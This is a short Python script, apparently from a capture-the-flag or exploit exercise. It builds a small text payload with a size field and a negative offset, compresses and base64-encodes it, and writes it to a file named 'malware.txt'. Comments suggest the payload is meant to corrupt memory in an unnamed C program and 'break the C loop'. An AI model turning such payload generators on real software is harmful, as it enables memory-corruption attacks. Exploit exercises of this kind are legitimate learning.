#!/usr/bin/env python3
import zlib
import base64

# 1. The Raw Text Payload
# Note: Using implicit string concatenation to keep it clean without adding 
# Python's indentation spaces into the actual payload.
# payload_lines = [
#     "clear",
#     "512",
#     "0",
#     "1",
#     "1,502,-1"
# ]



# # 2. Join them all together with a newline, and add one final newline at the end
# load = "\n".join(payload_lines) + "\n"

load = (
"""
clear
128
0
1
65,-72,0
""")
"""
y: 512 - 0x200 bytes
x: 0x1 byte
"""

# load = load.decode('utf-8')
print("[*] Raw text to be compressed:")
print("---START---")
print(load, end="")
print("---END---")

# 2. Convert to bytes
raw_bytes = load.encode('utf-8')

# 3. Compress with Zlib (Level 9 is CRITICAL for the 'eNo' prefix)
compressed = zlib.compress(raw_bytes, level=9)

# 4. Base64 Encode
b64_encoded = base64.b64encode(compressed)

# 5. Decode back to string for easy copying/sending
final_payload = b64_encoded.decode('utf-8')

print("\n[*] Final Base64 Payload:")
print(final_payload)

# ... (your previous zlib and base64 code) ...
final_payload = b64_encoded.decode('utf-8')

# 6. Write it to a file!
output_filename = "malware.txt"

with open(output_filename, "w") as f:
    f.write(final_payload)
    # Add the required empty newline at the very end to break the C loop!
    f.write("\n\n") 

print(f"[+] Success! Payload written to {output_filename}")